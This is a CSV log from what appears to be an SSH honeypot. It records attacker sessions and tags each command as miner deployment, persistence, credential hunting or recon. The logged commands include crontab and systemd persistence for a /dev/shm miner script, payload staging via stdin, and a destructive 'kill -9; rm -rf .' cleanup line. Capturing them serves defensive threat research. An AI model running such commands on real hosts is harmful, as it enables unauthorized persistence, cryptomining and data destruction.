session_id,ip,username,mode,ssh_original_command,categories,malware_upload,malware_upload_reasons,termination_reason,created_files
1776767617_149.210.235.123_60696_sshshadow,149.210.235.123,deploy,non_interactive_exec,"CRON=""$(crontab -l 2>/dev/null || true)"" echo ""$CRON"" | grep -F '/dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""' >/dev/null 2>&1 || \ printf '%s\n%s\n' ""@reboot /dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" ""0 * * * * cd ""/dev/shm"" && ./w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" | (cat -; echo ""$CRON"") | crontab -",Data / credential hunting; Miner deployment; SSH persistence,True,"suspicious_created_files:tmp/.ssh-shadow/session/commands.jsonl,tmp/.ssh-shadow/session/events.jsonl,tmp/.ssh-shadow/session/provenance.json",exit_code_127,tmp/.ssh-shadow/session/commands.jsonl; tmp/.ssh-shadow/session/events.jsonl; tmp/.ssh-shadow/session/provenance.json
1776767621_149.210.235.123_60696_sshshadow,149.210.235.123,deploy,non_interactive_exec,sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service',Data / credential hunting; File transfer / staging; Miner deployment; SSH persistence,True,"script_upload_via_stdin_or_scp; suspicious_created_files:tmp/.ssh-shadow/session/commands.jsonl,tmp/.ssh-shadow/session/events.jsonl,tmp/.ssh-shadow/session/provenance.json",exit_code_1,tmp/.ssh-shadow/session/commands.jsonl; tmp/.ssh-shadow/session/events.jsonl; tmp/.ssh-shadow/session/provenance.json
1776767625_149.210.235.123_60696_sshshadow,149.210.235.123,deploy,non_interactive_exec,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Data / credential hunting; GCS-aware discovery; Generic recon; SSH persistence,True,"suspicious_created_files:tmp/.ssh-shadow/session/commands.jsonl,tmp/.ssh-shadow/session/events.jsonl,tmp/.ssh-shadow/session/provenance.json",normal_exit,tmp/.ssh-shadow/session/commands.jsonl; tmp/.ssh-shadow/session/events.jsonl; tmp/.ssh-shadow/session/provenance.json
1776767628_149.210.235.123_60696_sshshadow,149.210.235.123,deploy,non_interactive_exec,readlink -f /proc/gcs/exe,Data / credential hunting; GCS-aware discovery; SSH persistence,True,"suspicious_created_files:tmp/.ssh-shadow/session/commands.jsonl,tmp/.ssh-shadow/session/events.jsonl,tmp/.ssh-shadow/session/provenance.json",exit_code_127,tmp/.ssh-shadow/session/commands.jsonl; tmp/.ssh-shadow/session/events.jsonl; tmp/.ssh-shadow/session/provenance.json
1776767632_149.210.235.123_60696_sshshadow,149.210.235.123,deploy,non_interactive_exec,kill -9 $(lsof +D . 2>/dev/null | awk '{print $2}' | sort -u); rm -rf .; crontab -l 2>/dev/null | grep -v . | crontab -,Data / credential hunting; SSH persistence,True,"suspicious_created_files:tmp/.ssh-shadow/session/commands.jsonl,tmp/.ssh-shadow/session/events.jsonl,tmp/.ssh-shadow/session/provenance.json",exit_code_127,tmp/.ssh-shadow/session/commands.jsonl; tmp/.ssh-shadow/session/events.jsonl; tmp/.ssh-shadow/session/provenance.json
1776767635_149.210.235.123_60696_sshshadow,149.210.235.123,deploy,non_interactive_exec,kill -9 gcs,Data / credential hunting; GCS-aware discovery; SSH persistence,True,"suspicious_created_files:tmp/.ssh-shadow/session/commands.jsonl,tmp/.ssh-shadow/session/events.jsonl,tmp/.ssh-shadow/session/provenance.json",exit_code_1,tmp/.ssh-shadow/session/commands.jsonl; tmp/.ssh-shadow/session/events.jsonl; tmp/.ssh-shadow/session/provenance.json
1776767638_149.210.235.123_60696_sshshadow,149.210.235.123,deploy,non_interactive_exec,readlink -f /proc/gcs/exe,Data / credential hunting; GCS-aware discovery; SSH persistence,True,"suspicious_created_files:tmp/.ssh-shadow/session/commands.jsonl,tmp/.ssh-shadow/session/events.jsonl,tmp/.ssh-shadow/session/provenance.json",exit_code_127,tmp/.ssh-shadow/session/commands.jsonl; tmp/.ssh-shadow/session/events.jsonl; tmp/.ssh-shadow/session/provenance.json
1776767641_149.210.235.123_60696_sshshadow,149.210.235.123,deploy,non_interactive_exec,kill -9 $(lsof +D . 2>/dev/null | awk '{print $2}' | sort -u); rm -rf .; crontab -l 2>/dev/null | grep -v . | crontab -,Data / credential hunting; SSH persistence,True,"suspicious_created_files:tmp/.ssh-shadow/session/commands.jsonl,tmp/.ssh-shadow/session/events.jsonl,tmp/.ssh-shadow/session/provenance.json",exit_code_127,tmp/.ssh-shadow/session/commands.jsonl; tmp/.ssh-shadow/session/events.jsonl; tmp/.ssh-shadow/session/provenance.json
1776767645_149.210.235.123_60696_sshshadow,149.210.235.123,deploy,,kill -9 gcs,GCS-aware discovery,False,,,
1776767650_149.210.235.123_60696_sshshadow,149.210.235.123,deploy,,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,,
1776767794_149.210.235.123_37116_sshshadow,149.210.235.123,test,,uname -a,GCS-aware discovery; Host profiling,False,,,
1776767795_149.210.235.123_37116_sshshadow,149.210.235.123,test,,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Generic recon,True,suspicious_created_files:usr/lib/python3.11/sitecustomize.py,exit_code_125,usr/lib/python3.11/sitecustomize.py
1776767796_149.210.235.123_37116_sshshadow,149.210.235.123,test,,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,True,suspicious_created_files:usr/lib/python3.11/sitecustomize.py,exit_code_125,usr/lib/python3.11/sitecustomize.py
1776778791_104.248.164.226_56802_sshshadow,104.248.164.226,deploy,,uname -a,GCS-aware discovery; Host profiling,False,,,
1776796197_104.39.130.23_56542_sshshadow,104.39.130.23,admin,interactive_shell,,Data / credential hunting; Generic recon; SSH persistence,True,"suspicious_created_files:tmp/.session_bashrc,tmp/.ssh-shadow/session/commands.jsonl,tmp/.ssh-shadow/session/events.jsonl,tmp/.ssh-shadow/session/provenance.json",normal_exit,tmp/.session_bashrc; tmp/.ssh-shadow/session/commands.jsonl; tmp/.ssh-shadow/session/events.jsonl; tmp/.ssh-shadow/session/provenance.json
